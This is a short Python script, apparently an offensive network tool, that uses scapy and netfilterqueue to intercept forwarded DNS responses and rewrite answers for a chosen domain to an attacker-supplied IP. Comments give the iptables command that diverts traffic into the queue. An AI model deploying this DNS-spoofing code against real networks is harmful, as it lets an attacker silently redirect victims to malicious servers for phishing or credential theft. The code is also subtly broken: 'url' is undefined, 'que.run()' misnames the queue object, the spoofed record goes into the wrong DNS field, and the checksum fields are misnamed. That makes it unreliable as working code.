from scapy.all import *
import netfilterqueue

# redirect tables to queue
# iptables -I FORWARD -j NFQUEUE --queue-num 0

# restore iptables
# iptables --flush

def process_packet(packet):
	scapy_packet = IP(packet.get_payload())
	if scapy_packet.haslayer(DNSRR):

		requested_url = scapy_packet[DNSRR].qname

		if url in requested_url:
			answer = DNSRR(rrname=requested_url, rdata="ip_to_redirect")
			scapy_packet[DNSRR].ar = answer
			scapy_packet[DNS].ancount = 1

			del scapy_packet[IP].len
			del scapy_packet[IP].checksum
			del scapy_packet[UDP].checksum
			del scapy_packet[UDP].len

			packet.set_payload(str(scapy_packet))

	packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
que.run()